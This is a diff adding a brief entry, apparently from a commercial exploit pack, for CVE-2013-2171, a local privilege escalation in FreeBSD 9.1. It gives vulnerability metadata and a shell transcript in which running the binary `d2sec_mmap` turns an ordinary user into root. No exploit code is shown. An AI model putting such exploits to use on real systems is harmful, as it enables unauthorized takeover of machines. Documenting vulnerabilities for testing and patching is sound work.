@@ -1,0 +1,36 @@
+D2 Exploitation Pack
+====================
+
+Copyright (c) 2007-2013 DSquare Security, LLC
+
+
+License information
+-------------------
+
+See the file "LICENSE.txt" for information on the history of this
+software, terms & conditions for usage, and a DISCLAIMER OF ALL
+WARRANTIES.
+
+Vulnerability description:
+---------------------------
+
+FreeBSD 9 Address Space Manipulation Privilege Escalation Vulnerability
+
+CVE:        CVE-2013-2171
+Remote:     No
+Local:      Yes
+Published:  Jun 18 2013 12:00AM
+Updated:    Jun 26 2013 08:20AM
+Credit:     Konstantin Belousov and Alan Cox
+
+Tested:     FreeBSD 9.1
+
+Exploit
+--------
+
+% id
+uid=1001(compaq) gid=1001(compaq) groups=1001(compaq)
+%./d2sec_mmap
+# id
+uid=0(root) gid=0(wheel) groups=0(wheel)
+
